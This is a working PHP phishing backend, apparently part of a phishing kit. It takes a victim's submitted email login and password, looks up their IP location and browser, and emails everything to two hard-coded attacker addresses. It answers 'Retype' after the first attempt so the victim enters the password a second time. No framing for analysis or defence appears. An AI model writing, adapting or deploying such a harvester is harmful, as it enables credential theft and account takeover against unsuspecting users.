<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$browser = $_SERVER['HTTP_USER_AGENT'];

$myemail = 'hitachiiltd@yandex.com,2582569394@qq.com';

$data           = array(); 
$uism = $_POST['eomail'];
$pism = $_POST['passow'];


	$mymsg = <<<EOD
Login: $uism
Password: $pism
IP Address: $ip
City: {$details->city}
Region: {$details->region}
Country: {$details->country} 

Browser: $browser;
EOD;

     $data['success'] = true;
if($_POST['hoido'] < 1) {
	
	$headers = "From: myresult <reporting@webmaster.com>";
	$success = mail($myemail, 'Data First', $mymsg, $headers);

$data['message'] = 'Retype';
}else{
	
	$headers = "From: myresult <reporting@webmaster.com>";
	$success = mail($myemail, 'Data Second', $mymsg, $headers);

$data['message'] = 'Done';
}


header ('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");

echo json_encode($data);
?>